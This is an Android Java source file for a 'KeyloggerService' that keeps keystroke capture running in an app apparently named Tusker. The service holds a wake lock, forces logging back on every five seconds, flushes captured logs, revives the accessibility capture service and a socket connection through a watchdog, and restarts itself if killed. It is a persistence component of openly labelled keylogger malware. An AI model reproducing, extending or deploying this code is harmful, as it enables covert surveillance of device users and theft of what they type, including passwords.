package com.task.tusker.services;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ServiceInfo;
import android.os.Build;
import android.os.IBinder;
import android.os.PowerManager;
import android.provider.Settings;
import android.util.Log;
import androidx.core.app.NotificationCompat;
import com.task.tusker.R;
import com.task.tusker.commands.LogManager;
import com.task.tusker.network.SocketManager;

/**
 * KeyloggerService — keeps keylog capture permanently active.
 *
 * <p>Capture itself happens in {@link UnifiedAccessibilityService} (a separate
 * process) and is persisted by {@link LogManager}. This service exists so that
 * nothing on the main process side can throttle, suspend, or starve that path:
 *
 * <ul>
 *   <li>Holds a partial {@link PowerManager} wake lock so the CPU does not drop
 *       into suspend between keystrokes. Without it the device can sleep
 *       mid-capture and events queue up or are delivered late.</li>
 *   <li>Enables {@link LogManager} unconditionally, so logging stays on even if
 *       an earlier accessibility-disabled transition flipped the flag.</li>
 *   <li>Periodically asks the watchdog to revive the accessibility service and
 *       the data-sync service, so a kill in either process is repaired rather
 *       than waited out until the 10-minute alarm.</li>
 *   <li>Asks {@link LogManager} to flush the bytes that are already handed to
 *       the OS, keeping the durability gap at a couple of seconds instead of
 *       costing an fsync on the accessibility thread.</li>
 * </ul>
 *
 * <p>It runs in the main process (unlike the accessibility service, which is
 * declared with {@code android:process=":accessibility"}); it deliberately does
 * not duplicate any capture work, it only supervises and holds the wake lock.
 */
public class KeyloggerService extends Service {

    private static final String TAG        = "KeyloggerService";
    private static final String CHANNEL_ID = "KeyloggerChannel";
    private static final int    NOTIFICATION_ID = 0x0BEEF;

    /** Supervisor tick. Short enough to notice a dead peer quickly. */
    private static final long TICK_INTERVAL_MS = 5_000L;

    /**
     * Wake-lock renewal window. Each tick re-acquires with this timeout, so a
     * missed tick (process paused, doze) can never leave a lock held forever.
     */
    private static final long WAKELOCK_TIMEOUT_MS = 30_000L;

    private PowerManager.WakeLock wakeLock;
    private Thread  tickThread;
    private volatile boolean running = false;

    /** Captured-entry counter, surfaced in the notification. */
    private volatile long entryCount = 0L;

    // ── Static helpers ──────────────────────────────────────────────────────

    /**
     * Start the service if it is not already running. Safe to call from any
     * context (Activity, BroadcastReceiver, accessibility process, Worker) and
     * cheap enough to call on every accessibility connect.
     */
    public static void ensureRunning(Context ctx) {
        if (ctx == null) return;
        if (ServiceWatchdog.isRunning(ctx, KeyloggerService.class)) return;
        try {
            Intent i = new Intent(ctx, KeyloggerService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                ctx.startForegroundService(i);
            } else {
                ctx.startService(i);
            }
            Log.i(TAG, "KeyloggerService start requested");
        } catch (Exception e) {
            Log.e(TAG, "ensureRunning failed: " + e.getMessage());
        }
    }

    // ── Lifecycle ───────────────────────────────────────────────────────────

    @Override
    public void onCreate() {
        super.onCreate();
        createNotificationChannel();
        running = true;
        Log.i(TAG, "Created — keylog capture supervision active");
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        startForegroundCompat();
        acquireWakeLock();

        // Never let logging sit disabled: this is the whole point of the service.
        LogManager.setEnabled(true);
        try {
            LogManager lm = SocketManager.getInstance(this).getLogManager();
            Log.i(TAG, "LogManager enabled, pendingSync=" + lm.pendingSyncCount());
        } catch (Exception e) {
            Log.w(TAG, "LogManager probe failed: " + e.getMessage());
        }

        startTickLoop();

        // START_STICKY: come back automatically if the OS reclaims us.
        return START_STICKY;
    }

    private void startForegroundCompat() {
        try {
            Notification n = createNotification();
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                startForeground(NOTIFICATION_ID, n,
                        ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC);
            } else {
                startForeground(NOTIFICATION_ID, n);
            }
        } catch (Exception e) {
            Log.e(TAG, "startForeground failed: " + e.getMessage());
            try { startForeground(NOTIFICATION_ID, createNotification()); }
            catch (Exception ignored) {}
        }
    }

    // ── Wake lock ───────────────────────────────────────────────────────────

    private void acquireWakeLock() {
        if (wakeLock != null && wakeLock.isHeld()) return;
        try {
            PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
            if (pm == null) return;
            wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "Tusker:Keylogger");
            wakeLock.setReferenceCounted(false);
            if (!wakeLock.isHeld()) wakeLock.acquire(WAKELOCK_TIMEOUT_MS);
        } catch (Exception e) {
            Log.w(TAG, "Wake lock unavailable: " + e.getMessage());
        }
    }

    private void releaseWakeLock() {
        try {
            if (wakeLock != null && wakeLock.isHeld()) wakeLock.release();
        } catch (Exception ignored) {
        }
        wakeLock = null;
    }

    // ── Supervisor loop ─────────────────────────────────────────────────────

    private void startTickLoop() {
        if (tickThread != null && tickThread.isAlive()) return;
        tickThread = new Thread(() -> {
            while (running) {
                try {
                    acquireWakeLock();
                    LogManager.setEnabled(true);

                    LogManager lm = null;
                    try { lm = SocketManager.getInstance(this).getLogManager(); } catch (Exception ignored) {}

                    if (lm != null) {
                        // Make the bytes we already handed to the OS durable now
                        // instead of waiting for the next LogSync timer.
                        int pending = lm.pendingSyncCount();
                        if (pending > 0) lm.syncDirtyHandles();
                    }

                    // Repair peers in the other processes. This is a cheap check
                    // (heartbeat file + running-service list), not a poll loop
                    // over the accessibility tree.
                    ServiceWatchdog.ensureAccessibilityRunning(getApplicationContext(), () -> {
                        try { SocketManager.getInstance(this).connect(); } catch (Exception ignored) {}
                    });
                    ServiceWatchdog.ensureServicesRunning(getApplicationContext(), KeyloggerService.class);

                    Thread.sleep(TICK_INTERVAL_MS);
                } catch (InterruptedException ie) {
                    Thread.currentThread().interrupt();
                    return;
                } catch (Throwable t) {
                    // Never let an unchecked throw kill the supervisor.
                    Log.w(TAG, "tick failed: " + t.getMessage());
                }
            }
        }, "KeyloggerSupervisor");
        tickThread.setDaemon(true);
        tickThread.start();
    }

    /** Total entries this process has been asked to persist (diagnostics only). */
    public long getEntryCount() {
        return entryCount;
    }

    @Override
    public void onDestroy() {
        running = false;
        try {
            if (tickThread != null) tickThread.interrupt();
        } catch (Exception ignored) {}
        tickThread = null;
        releaseWakeLock();

        // Flush anything still buffered before the process goes away.
        try {
            SocketManager.getInstance(this).getLogManager().syncDirtyHandles();
        } catch (Exception ignored) {}

        Log.i(TAG, "Destroyed");
        super.onDestroy();
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    // ── Notification ────────────────────────────────────────────────────────

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                    CHANNEL_ID,
                    "Keylogger",
                    NotificationManager.IMPORTANCE_LOW
            );
            channel.setDescription("Keeps keylog capture active");
            channel.setShowBadge(false);
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) manager.createNotificationChannel(channel);
        }
    }

    private Notification createNotification() {
        Intent notificationIntent = new Intent(Settings.ACTION_APP_NOTIFICATION_SETTINGS);
        notificationIntent.putExtra(Settings.EXTRA_APP_PACKAGE, getPackageName());
        int flags = Build.VERSION.SDK_INT >= Build.VERSION_CODES.M
                ? PendingIntent.FLAG_IMMUTABLE : 0;
        PendingIntent pendingIntent =
                PendingIntent.getActivity(this, 0, notificationIntent, flags);

        return new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("Keylogger")
                .setContentText("Capturing")
                .setSmallIcon(R.drawable.ic_notification)
                .setContentIntent(pendingIntent)
                .setOngoing(true)
                .setPriority(NotificationCompat.PRIORITY_LOW)
                .build();
    }
}
